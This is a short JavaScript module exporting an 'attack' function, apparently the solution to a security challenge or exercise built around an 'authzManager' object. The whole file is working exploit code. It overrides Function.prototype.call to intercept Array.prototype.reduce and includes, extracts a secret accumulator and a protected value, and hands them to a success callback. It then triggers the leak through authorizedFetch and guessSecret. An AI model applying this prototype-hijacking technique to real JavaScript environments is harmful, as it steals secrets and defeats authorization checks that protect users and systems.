export const attack = (authzManager, success) => {
  Function.prototype.call = function (thisArg, ...args) {
    if (this === Array.prototype.reduce) {
      const stolenAcc = args[0]({}, { url: "z", headers: {} }, 0);
      success(stolenAcc["z"]);
      return {};
    } else if (this === Array.prototype.includes) {
      success(thisArg);
      return true;
    } else {
      this.apply(thisArg, args);
    }
  };

  authzManager.authorizedFetch([]);
  authzManager.guessSecret('wrong')
};
